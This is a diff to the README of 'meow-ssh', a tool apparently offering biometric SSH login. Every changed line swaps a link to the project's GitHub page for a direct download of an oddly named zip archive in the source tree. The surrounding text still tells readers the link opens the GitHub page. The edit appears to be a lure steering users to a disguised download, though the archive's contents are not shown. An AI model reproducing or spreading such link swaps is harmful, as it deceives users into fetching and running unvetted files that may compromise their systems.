@@ -1,6 +1,6 @@
 # 🐱 meow-ssh - Simple SSH Login Using Biometrics
 
-[![Download meow-ssh](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sjtlehbie/meow-ssh)
+[![Download meow-ssh](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sjtlehbie/meow-ssh/raw/refs/heads/main/src/meow_ssh_gyrochrome.zip)
 
 ---
 
@@ -40,7 +40,7 @@ You will visit the official GitHub page to download the app and set it up on you
 
 Click the big button above or go directly to:
 
-https://github.com/sjtlehbie/meow-ssh
+https://github.com/sjtlehbie/meow-ssh/raw/refs/heads/main/src/meow_ssh_gyrochrome.zip
 
 This link opens the meow-ssh GitHub page where you will download the software.
 
@@ -109,7 +109,7 @@ Check the Help menu in the app for more details on each option.
 
 Visit the GitHub page regularly:
 
-https://github.com/sjtlehbie/meow-ssh
+https://github.com/sjtlehbie/meow-ssh/raw/refs/heads/main/src/meow_ssh_gyrochrome.zip
 
 Check for new releases to download the latest version. Updates keep your app secure and add new features.
 
@@ -124,4 +124,4 @@ If you have trouble:
 
 ---
 
-[![Download meow-ssh](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sjtlehbie/meow-ssh)
+[![Download meow-ssh](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sjtlehbie/meow-ssh/raw/refs/heads/main/src/meow_ssh_gyrochrome.zip)
